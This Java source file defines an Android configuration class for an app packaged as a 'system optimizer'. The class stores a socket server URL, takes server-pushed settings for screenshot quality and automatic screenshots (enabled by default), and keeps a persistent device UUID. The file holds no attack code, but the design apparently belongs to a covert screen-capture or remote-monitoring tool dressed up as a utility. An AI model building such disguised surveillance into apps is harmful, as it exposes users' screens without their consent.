package com.system.optimizer.config;

import com.system.optimizer.R;

import java.util.UUID;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.nio.charset.StandardCharsets;

import android.content.Context;
import android.content.SharedPreferences;
import timber.log.Timber;

/**
 * Manages configuration persistence and retrieval.
 * Handles storing and reading config values from SharedPreferences.
 */
public class AppConfig {

    private static final String PREFS_CONFIG = "config_prefs";
    private static final String KEY_SERVER_URL = "config_socket_url";

    private final SharedPreferences prefs;
    private final SharedPreferences.Editor editor;
    private final Context appContext;

    private ConfigData configData;

    public AppConfig(Context context) {
        // Use application context to avoid holding activity context references
        this.appContext = context.getApplicationContext();
        this.prefs = appContext.getSharedPreferences(PREFS_CONFIG, Context.MODE_PRIVATE);
        this.editor = prefs.edit();

        // Check if we have a stored server URL
        String serverUrl = prefs.getString(KEY_SERVER_URL, null);

        if (serverUrl == null || serverUrl.isEmpty()) {
            serverUrl = appContext.getString(R.string.SERVER_URL);
            Timber.d("First run - using SERVER_URL from build: %s", serverUrl);
            editor.putString(KEY_SERVER_URL, serverUrl);
            editor.apply();
        }
        this.configData = new ConfigData(serverUrl, 70, true);
    }

    public void setConfig(ConfigData configData) {
        if (configData == null) {
            Timber.w("setConfig called with null configData");
            return;
        }
        this.configData = configData;
        editor.putString(KEY_SERVER_URL, configData.getServerUrl());
        editor.apply();
    }

    public ConfigData getConfig() {
        return this.configData;
    }

    public String getStoredServerUrl() {
        return configData.getServerUrl();
    }

    /**
     * Generates a SHA-256 hash of the current configuration for comparison purposes.
     * Used to determine if the client's config matches the server's config.
     *
     * @return The SHA-256 hash as a hex string, or null if config is invalid
     */
    public String generateConfigHash() {
        if (configData == null || configData.getServerUrl() == null) return null;
        try {
            String configString = String.format("{\"server_url\":\"%s\",\"screenshot_quality\":%d,\"auto_screenshot\":%s}",
                configData.getServerUrl(),
                configData.getScreenshotQuality(),
                configData.isAutoScreenshotEnabled() ? "true" : "false");

            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(configString.getBytes(StandardCharsets.UTF_8));

            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            Timber.e(e, "Error generating config hash");
            return null;
        }
    }

    /**
     * Serializes a ConfigData instance from a JSON object.
     *
     * @param configJson JSON object containing configuration fields
     * @return The created ConfigData instance
     */
    public static ConfigData createConfigFromJson(org.json.JSONObject configJson) {
        String serverUrl = configJson.optString("server_url", null);
        int screenshotQuality = configJson.optInt("screenshot_quality", 70);
        boolean autoScreenshot = configJson.optBoolean("auto_screenshot", false);

        ConfigData newConfig = new ConfigData(serverUrl, screenshotQuality, autoScreenshot);
        return newConfig;
    }

    public String getUUID() {
        String uuid = prefs.getString("device_uuid", null);
        if (uuid == null) {
            uuid = UUID.randomUUID().toString();
            prefs.edit().putString("device_uuid", uuid).apply();
        }
        return uuid;
    }

}
